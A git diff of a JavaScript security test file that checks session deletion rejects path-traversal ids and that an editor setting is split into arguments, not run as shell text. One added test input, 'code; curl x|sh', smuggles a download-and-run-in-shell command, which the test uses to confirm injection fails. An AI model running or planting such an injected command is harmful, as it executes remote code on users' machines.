@@ -6,7 +6,7 @@ import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { readConfig } from '../src/main/config/reader.ts'
 import { deleteSession } from '../src/main/sessions/store.ts'
-import { ok } from './support/harness.mjs'
+import { equal, ok } from './support/harness.mjs'
 
 // a `---js` / `---javascript` frontmatter fence must NOT execute
 const proj = mkdtempSync(join(tmpdir(), 'clui-sec-'))
@@ -37,3 +37,13 @@ ok(await throws(() => deleteSession('slug', '../../outside/x')), 'security: trav
 ok(await throws(() => deleteSession('..', 'id')), 'security: slug ".." rejected')
 ok(await throws(() => deleteSession('slug', '')), 'security: empty id rejected')
 ok(await throws(() => deleteSession('slug', 'a/b')), 'security: separator in id rejected')
+
+// The editor setting reaches the login shell as arguments, never as script text.
+{
+  const { editorArgv } = await import('../src/main/ide/open.ts')
+  const { homedir } = await import('node:os')
+  equal(JSON.stringify(editorArgv('code -r')), '["code","-r"]', 'editor: words split on whitespace')
+  equal(JSON.stringify(editorArgv('open -a "Visual Studio Code"')), '["open","-a","Visual Studio Code"]', 'editor: quoted words stay whole')
+  equal(editorArgv('~/bin/subl')[0], homedir() + '/bin/subl', 'editor: a leading ~/ expands')
+  equal(JSON.stringify(editorArgv('code; curl x|sh')), '["code;","curl","x|sh"]', 'editor: shell syntax stays literal words')
+}
